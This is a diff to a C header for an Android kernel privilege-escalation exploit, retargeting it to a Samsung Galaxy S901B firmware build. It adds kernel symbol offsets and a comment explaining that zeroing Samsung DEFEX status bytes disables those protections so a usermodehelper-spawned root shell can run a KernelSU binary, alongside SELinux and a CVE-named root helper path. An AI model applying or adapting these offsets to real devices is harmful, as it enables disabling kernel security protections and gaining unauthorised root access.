@@ -22,16 +22,16 @@
  *   5. worker_pool = 896 bytes
  */
 
-#define BUILD_VARIANT_LABEL "b0q_taro_v5.10"
+#define BUILD_VARIANT_LABEL "S901BXXSNGZD7"
 #ifndef BUILD_FINGERPRINT
-#define BUILD_FINGERPRINT "samsung/b0qcsx/b0q:15/AP3A.240905.015.A2/S908WVLS8FYG7:user/release-keys"
+#define BUILD_FINGERPRINT "samsung/r0sxeea/r0s:16/BP2A.250605.031.A3/S901BXXSNGZD7:user/release-keys"
 #endif
 
 /* ---- Kernel image layout (verified from QEMU kernel) ---- */
 #define KIMAGE_TEXT_BASE 0xffffffc008000000ULL
 #define P0_PAGE_OFFSET   0xffffff8000000000ULL   /* 39-bit VA PAGE_OFFSET     */
 #define P0_PHYS_OFFSET   0x80000000ULL           /* memstart_addr             */
-#define P0_KERNEL_PHYS_LOAD 0xa8000000ULL        /* Kernel code phys start    */
+#define P0_KERNEL_PHYS_LOAD 0x80000000ULL        /* exact GZD7 sboot pre-slide kernel base */
 
 #define KERNELSNITCH_IDENTITY_START 0xffffff8000000000ULL
 #define KERNELSNITCH_IDENTITY_END   0xffffff9000000000ULL   /* 64GB direct map */
@@ -50,11 +50,6 @@
 #define ASHMEM_OPEN_OFF          0x00c68d68ULL   /* ashmem_open            */
 #define ASHMEM_RELEASE_OFF       0x00c68decULL   /* ashmem_release         */
 #define ASHMEM_SHOW_FDINFO_OFF   0x00c68f0cULL   /* ashmem_show_fdinfo     */
-
-#define GLOBAL_PRIVESC_STATUS_OFF    0x02022158ULL  /* global_privesc_status  */
-#define GLOBAL_SAFEPLACE_STATUS_OFF  0x0202215cULL  /* global_safeplace_status */
-#define GLOBAL_INTEGRITY_STATUS_OFF  0x02022160ULL  /* global_integrity_status */
-#define GLOBAL_IMMUTABLE_STATUS_OFF  0x02022164ULL  /* global_immutable_status */
 
 /*
  * configfs — v5.10 uses old .read/.write API, not .read_iter/.write_iter.
@@ -83,6 +78,22 @@
  * the boot-time value only; writing it changes nothing at runtime (the
  * 2026-08-08 device run's umh -EACCES: SELinux stayed enforcing). */
 #define SELINUX_ENFORCING_OFF   0x02288d58ULL   /* selinux_state.enforcing */
+
+/* Samsung DEFEX per-feature runtime status bytes (each u8: 0=off, 1=partial,
+ * 2=full). Zeroing them disables each DEFEX feature. global_safeplace_status
+ * is the one that kills exec of /data/local/tmp/ksud from the UMH-spawned
+ * root shell (dmesg: "[DEFEX] Safeplace violation [task=sh ... child=
+ * /data/local/tmp/ksud, uid=0]"). global_privesc_status also interferes with
+ * KernelSU UID-0 transitions, so all four are cleared. Method per
+ * Memetic0/Root-My-Galaxy-Payloads-standalone docs/SM-S906B-S906BXXSNGZD7.md
+ * ("Samsung DEFEX bypass"); addresses below are S901B GZD7 vmlinux values
+ * (kallsyms: global_privesc_status @ 0xffffffc00a052158, +4 bytes each),
+ * NOT the S906B values (0x02022158) — same method, different kernel build. */
+#define GLOBAL_PRIVESC_STATUS_OFF    0x02052158ULL  /* global_privesc_status  */
+#define GLOBAL_SAFEPLACE_STATUS_OFF  0x0205215cULL  /* global_safeplace_status */
+#define GLOBAL_INTEGRITY_STATUS_OFF  0x02052160ULL  /* global_integrity_status */
+#define GLOBAL_IMMUTABLE_STATUS_OFF  0x02052164ULL  /* global_immutable_status */
+
 #define KMALLOC_CACHES_OFF      0x01bf6700ULL   /* kmalloc_caches      */
 #define ANON_PIPE_BUF_OPS_OFF   0x01a25c28ULL   /* anon_pipe_buf_ops   */
 
@@ -102,12 +113,12 @@
 #define INIT_TASK          (KIMAGE_TEXT_BASE + INIT_TASK_OFF)
 #define ROOT_TASK_GROUP    (KIMAGE_TEXT_BASE + ROOT_TASK_GROUP_OFF)
 #define SELINUX_ENFORCING  (KIMAGE_TEXT_BASE + SELINUX_ENFORCING_OFF)
-#define KMALLOC_CACHES     (KIMAGE_TEXT_BASE + KMALLOC_CACHES_OFF)
-#define ANON_PIPE_BUF_OPS  (KIMAGE_TEXT_BASE + ANON_PIPE_BUF_OPS_OFF)
 #define GLOBAL_PRIVESC_STATUS    (KIMAGE_TEXT_BASE + GLOBAL_PRIVESC_STATUS_OFF)
 #define GLOBAL_SAFEPLACE_STATUS  (KIMAGE_TEXT_BASE + GLOBAL_SAFEPLACE_STATUS_OFF)
 #define GLOBAL_INTEGRITY_STATUS  (KIMAGE_TEXT_BASE + GLOBAL_INTEGRITY_STATUS_OFF)
 #define GLOBAL_IMMUTABLE_STATUS  (KIMAGE_TEXT_BASE + GLOBAL_IMMUTABLE_STATUS_OFF)
+#define KMALLOC_CACHES     (KIMAGE_TEXT_BASE + KMALLOC_CACHES_OFF)
+#define ANON_PIPE_BUF_OPS  (KIMAGE_TEXT_BASE + ANON_PIPE_BUF_OPS_OFF)
 
 /* ---- Root usermodehelper ---- */
 #define ROOT_UMH_PATH "/data/local/tmp/cve-2026-43499-root"
